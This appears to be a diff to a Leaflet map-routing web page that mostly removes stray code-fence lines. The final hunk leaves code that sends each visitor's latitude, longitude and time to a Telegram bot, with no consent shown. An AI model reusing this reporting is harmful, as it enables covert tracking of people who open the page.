@@ -109,7 +109,7 @@ if (startMarker) map.removeLayer(startMarker);
 if (endMarker) map.removeLayer(endMarker);
 if (routeControl) map.removeControl(routeControl);
 
-```
+
 const startIcon = L.icon({ iconUrl: "assets/custom-start.png", iconSize: [32, 32], iconAnchor: [16, 32] });
 const endIcon = L.icon({ iconUrl: "assets/red-marker.png", iconSize: [32, 32], iconAnchor: [16, 32] });
 
@@ -125,7 +125,7 @@ routeControl = L.Routing.control({
   draggableWaypoints: false,
   createMarker: () => null
 }).addTo(map);
-```
+
 
 });
 }
@@ -192,11 +192,10 @@ headers: { "Content-Type": "application/json" },
 body: JSON.stringify(payload)
 });
 
-```
+
 // Telegram
 const msg = `New visitor\nLat: ${lat}\nLon: ${lon}\nTime: ${payload.time}`;
 fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`);
-```
 
 });
 }
